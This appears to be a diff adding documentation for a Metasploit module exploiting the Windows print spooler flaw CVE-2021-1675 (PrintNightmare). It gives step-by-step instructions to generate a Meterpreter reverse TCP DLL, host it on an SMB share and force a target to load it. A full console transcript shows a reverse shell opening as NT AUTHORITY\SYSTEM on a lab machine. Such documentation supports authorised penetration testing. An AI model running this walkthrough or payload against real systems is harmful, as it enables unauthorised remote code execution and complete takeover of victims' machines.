@@ -1,0 +1,94 @@
+## Vulnerable Application
+The print spooler service can be abused to load a remote DLL through a crafted DCERPC request.
+
+## Verification Steps
+
+1. Optionally, create a DLL payload that the target will execute
+    1. From msfconsole
+    1. Do: `use payload/windows/x64/meterpreter/reverse_tcp`
+    1. Set the `LHOST` and `LPORT` values
+    1. Do: `to_handler` to start the payload handler
+    1. Do: `generate -f dll -o /path/to/save/the/payload.dll` to generate the DLL file
+1. Start an SMB server with anonymous read access containing the DLL payload
+1. Exploit the vulnerability to force the target to load the DLL payload
+    1. From msfconsole
+    1. Do: `use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare`
+    1. Set the `RHOSTS` values
+    1. Set the `SMBUser` and `SMBPass` values
+    1. Set the `DLL_PATH` value to the UNC path to the server and payload DLL like `\\192.168.0.2\public\payload.dll`
+    1. Run the module
+
+## Options
+
+### DLL_PATH
+
+The path to the DLL that the server should load. This path can either be a network-based UNC path or a local path on the
+remote target.
+
+## Scenarios
+
+### Windows Server 2019
+
+First, generate the payload DLL or use an existing one. Copy it to the SMB server and note the UNC path. Any DLL can be
+used but the architecture must match the host. This example generates a 64-bit Meterpreter payload using the Reverse TCP
+stager.
+
+```
+msf6 > use payload/windows/x64/meterpreter/reverse_tcp
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST 192.168.159.128 
+LHOST => 192.168.159.128
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler 
+[*] Payload Handler Started as Job 0
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > 
+[*] Started reverse TCP handler on 192.168.159.128:4444 
+
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > generate -f dll -o /tmp/reverse_tcp.x64.dll
+[*] Writing 8704 bytes to /tmp/reverse_tcp.x64.dll...
+msf6 payload(windows/x64/meterpreter/reverse_tcp) >
+```
+
+Next, use the module to trigger loading the DLL. Note that when setting the `DLL_PATH` option, the `\` characters are
+doubled to be escaped on the command line.
+
+```
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare 
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set DLL_PATH \\\\192.168.159.128\\public\\reverse_tcp.x64.dll
+DLL_PATH => \\192.168.159.128\public\reverse_tcp.x64.dll
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS 192.168.159.96
+RHOSTS => 192.168.159.96
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set SMBUSER aliddle
+SMBUSER => aliddle
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set SMBPASS Password1
+SMBPASS => Password1
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > run
+[*] Running module against 192.168.159.96
+
+[*] 192.168.159.96:445 - Target environment: Windows v10.0.17763 (x64)
+[*] 192.168.159.96:445 - Binding to 12345678-1234-abcd-ef00-0123456789ab:1.0@ncacn_np:192.168.159.96[\spoolss] ...
+[*] 192.168.159.96:445 - Bound to 12345678-1234-abcd-ef00-0123456789ab:1.0@ncacn_np:192.168.159.96[\spoolss] ...
+[*] 192.168.159.96:445 - Enumerating the installed printer drivers...
+[*] 192.168.159.96:445 - Using driver path: C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_2097e02ea77b432e\Amd64\UNIDRV.DLL
+[*] 192.168.159.96:445 - Using directory: C:\Windows\system32\spool\DRIVERS\x64
+[*] 192.168.159.96:445 - RpcAddPrinterDriverEx response 0 ERROR_SUCCESS (The operation completed successfully.)
+[*] Sending stage (200262 bytes) to 192.168.159.96
+[*] 192.168.159.96:445 - Error STATUS_PIPE_BROKEN (The pipe operation has failed because the other end of the pipe has been closed.)
+[-] 192.168.159.96:445 - Error STATUS_PIPE_CLOSING (The specified named pipe is in the closing state.)
+[-] 192.168.159.96:445 - Error STATUS_PIPE_CLOSING (The specified named pipe is in the closing state.)
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > [*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.96:49732) at 2021-07-02 15:59:30 -0400
+
+msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > sessions -i -1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WIN-3MSP8K2LCGC
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : MSFLAB
+Logged On Users : 9
+Meterpreter     : x64/windows
+meterpreter >
+```
